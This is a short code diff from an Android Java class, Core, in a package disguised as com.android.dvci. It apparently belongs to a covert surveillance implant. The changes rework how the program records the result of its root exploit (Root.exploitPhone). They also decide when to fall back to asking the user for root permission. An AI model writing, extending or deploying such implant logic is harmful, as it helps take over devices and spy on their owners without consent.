@@ -8,7 +8,6 @@
 package com.android.dvci;
 
 import java.io.IOException;
-import java.util.concurrent.Semaphore;
 
 import android.app.Activity;
 import android.app.ActivityManager;
@@ -73,7 +72,7 @@ public class Core extends Activity implements Runnable {
 	private CheckAction checkActionFast;
 	private PendingIntent alarmIntent = null;
 	private ServiceMain serviceMain;
-	private boolean exploitTried = false;
+
 
 	@SuppressWarnings("unused")
 	private void Core() {
@@ -116,10 +115,11 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " (Start): service already running"); //$NON-NLS-1$
 			}
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "  exploitStatus == " + exploitTried);
+				Check.log(TAG + "  exploitStatus == " + Status.getExploitStatusString() +"  exploitResult == " + Status.getExploitResultString());
 			}
 
-			if (exploitTried && !Status.haveRoot()) {
+			/* this check is used to know if we need to ask the user for root permission */
+			if ((Status.getExploitResult() > Status.EXPLOIT_STATUS_RUNNING ) && !Status.haveRoot()) {
 				try {
 					Thread t = new Thread(new Runnable() {
 						@Override
@@ -139,7 +139,8 @@ public class Core extends Activity implements Runnable {
 				}
 			} else {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (Start): don't calling getPermissions() haveRoot=" + Status.haveRoot() + " exploitStatus != TRIED " + exploitTried);
+					Check.log(TAG + " (Start): skipped getPermissions() haveRoot=" + Status.haveRoot() + " exploitResult= " + Status.getExploitResultString()+
+							" exploitStatus= " + Status.getExploitStatusString() );
 				}
 
 			}
@@ -246,8 +247,7 @@ public class Core extends Activity implements Runnable {
 		}
 
 		Keys.self();
-		Root.exploitPhone(true);
-		exploitTried = true;
+		Root.exploitPhone(false);
 		Root.getPermissions(false);
 
 		if (Status.haveRoot()) {
